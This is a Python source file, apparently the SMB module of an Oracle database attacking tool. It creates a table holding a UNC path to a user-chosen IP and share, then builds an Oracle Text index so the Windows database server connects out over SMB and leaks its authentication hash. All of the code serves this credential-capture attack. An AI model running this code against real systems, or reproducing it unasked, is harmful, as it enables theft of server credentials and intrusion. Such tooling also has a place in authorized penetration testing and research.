#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
from Utils import ErrorSQLRequest, checkOptionsGivenByTheUser
import logging
from Constants import *

class SMB (OracleDatabase):
	'''
	Allow the database to connect to a smb share and implement the smb authentication capture
	'''
	def __init__(self,args):
		'''
		Constructor
		'''
		logging.debug("SMB object created")
		OracleDatabase.__init__(self,args)
		self.localIp = "127.0.0.1"
		self.shareName = "SHARE"
		self.TABLE_NAME = "ODAT_SMB_table"
		self.SQL_CREATE_TABLE = "CREATE TABLE {0} (id NUMBER PRIMARY KEY, path VARCHAR(255) UNIQUE, ot_format VARCHAR(6))"
		self.SQL_DROP_TABLE = "DROP TABLE {0}"
		self.SQL_INSERTINTO = "INSERT INTO {0} VALUES (1, '\\\\{1}\\{2}', NULL)"
		self.INDEX_NAME = "ODAT_SMB_INDEX"
		self.SQL_CREATE_INDEX = "CREATE INDEX {0} ON {1}(path) INDEXTYPE IS ctxsys.context PARAMETERS ('datastore ctxsys.file_datastore format column ot_format')"
		self.SQL_DROP_INDEX = "DROP INDEX {0}"
		self.loadInformationRemoteDatabase()

	def createTable (self):
		'''
		Create a temporary table
		'''
		logging.info("Creating the table named {0}".format(self.TABLE_NAME))
		status = self.__execPLSQL__(self.SQL_CREATE_TABLE.format(self.TABLE_NAME))
		if isinstance(status,Exception):
			logging.info("Impossible to create the table named {0}: {1}".format(self.TABLE_NAME, self.cleanError(status)))
			return status
		else : 
			logging.info("The table named {0} is created".format(self.TABLE_NAME))
			logging.info("Inserting into the table named {0} in order to connect to \\\\{1}\\{2}".format(self.TABLE_NAME, self.localIp, self.shareName))
			status = self.__execPLSQL__(self.SQL_INSERTINTO.format(self.TABLE_NAME, self.localIp, self.shareName))
			if isinstance(status,Exception):
				logging.info("Impossible to insert into the table named {0}: {1}".format(self.TABLE_NAME, self.cleanError(status)))
				return status
			else : 
				logging.info("Insertion into the table named {0} done".format(self.TABLE_NAME))
				return True

	def deleteTable (self):
		'''
		delete the temporary table
		'''
		logging.info("Deleting the table named {0}".format(self.TABLE_NAME))
		status = self.__execPLSQL__(self.SQL_DROP_TABLE.format(self.TABLE_NAME))
		if isinstance(status,Exception):
			logging.info("Impossible to drop the table named {0}: {1}".format(self.TABLE_NAME, self.cleanError(status)))
			return status
		else : 
			logging.info("The table named {0} is dropped".format(self.TABLE_NAME))
			return True

	def createIndex (self):
		'''
		Create an index to start the SMB connection
		'''
		logging.info("Creating the index named {0}. SMB connection is establishing ....".format(self.INDEX_NAME))
		status = self.__execPLSQL__(self.SQL_CREATE_INDEX.format(self.INDEX_NAME, self.TABLE_NAME))
		if isinstance(status,Exception):
			logging.info("The index named {0} has not been created: {1}".format(self.INDEX_NAME, self.cleanError(status)))
			return status
		else : 
			logging.info("The index named {0} is created. The SMB connection to \\\\{1}\\{2} is done.".format(self.INDEX_NAME, self.localIp, self.shareName))
			return True
		
	def deleteIndex (self):
		'''
		Delete the index
		'''
		logging.info("Dropping the index named {0}".format(self.INDEX_NAME))
		status = self.__execPLSQL__(self.SQL_DROP_INDEX.format(self.INDEX_NAME))
		if isinstance(status,Exception):
			logging.info("The index named {0} has not been dropped: {1}".format(self.INDEX_NAME, self.cleanError(status)))
			return status
		else : 
			logging.info("The index named {0} is dropped".format(self.INDEX_NAME, self.localIp, self.shareName))
			return True

	def captureSMBAuthentication (self, localIP, shareName):
		'''
		Capture the SMB authentication
		'''
		self.localIp = localIP
		self.shareName = shareName
		logging.info("Delete table and index if exist")
		self.deleteTable() #Delete the table because the user can stop ODAT between the creation and the deleting
		self.deleteIndex() #Delete the index because the user can stop ODAT between the creation and the deleting
		logging.info("Capture the SMB authentication")
		if self.remoteSystemIsWindows() == True:
			logging.info("The remote server is Windows, good news")
			logging.info("Create the table and insert the share name in this one")
			status = self.createTable()
			if status == True:
				logging.info("Create an index")
				status = self.createIndex()
				if status == True:
					self.deleteIndex()
					self.deleteTable()
					return True
				else:
					self.deleteTable()
					return status
			else : 
				self.deleteTable()
				return status	
		else:
			logging.info("The remote server is Linux")
			return ErrorSQLRequest("The remote server is Linux")
		
	def testAll(self):
		'''
		Test all functions
		'''
		self.localIp = "127.0.0.1"
		self.shareName = "SHARE"
		logging.info("Delete table and index if exist")
		self.deleteTable() #Delete the table because the user can stop ODAT between the creation and the deleting
		self.deleteIndex() #Delete the index because the user can stop ODAT between the creation and the deleting
		self.args['print'].subtitle("SMB authentication capture ?")
		if self.remoteSystemIsWindows() == True:
			logging.info("The remote server is Windows")
			logging.info("Simulate the table creation and insertion")
			status = self.createTable()
			if status == True:
				logging.info("Simulate the index creation")
				status = self.createIndex()
				if status != True:
					self.deleteIndex()
					self.args['print'].badNews("KO")
				else:
					self.args['print'].unknownNews("Perhaps (try with --capture to be sure)")
				self.deleteTable()
			else : 
				self.deleteTable()
				self.args['print'].badNews("KO")	
		else:
			logging.info("The remote server is Linux")
			self.args['print'].badNews("KO")

def runSMBModule(args):
	'''
	'''
	status = True
	if checkOptionsGivenByTheUser(args,["test-module",'captureSMBAuthentication']) == False : return EXIT_MISS_ARGUMENT
	smb = SMB(args)
	status = smb.connection(stopIfError=True)
	if args['test-module'] == True :
		args['print'].title("Test if SMB authentication capture can be possible")
		status = smb.testAll()
	#Option 1: capture SMB authentication
	if args['captureSMBAuthentication'] !=None :
		args['print'].title("Try to capture the SMB authentication (Connection to \\\\{0}\\{1} )".format(args['captureSMBAuthentication'][0],args['captureSMBAuthentication'][1]))
		status = smb.captureSMBAuthentication(args['captureSMBAuthentication'][0],args['captureSMBAuthentication'][1])
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to capture the SMB authentication")
		else : 
			args['print'].goodNews("Check your SMB capture tool ...")



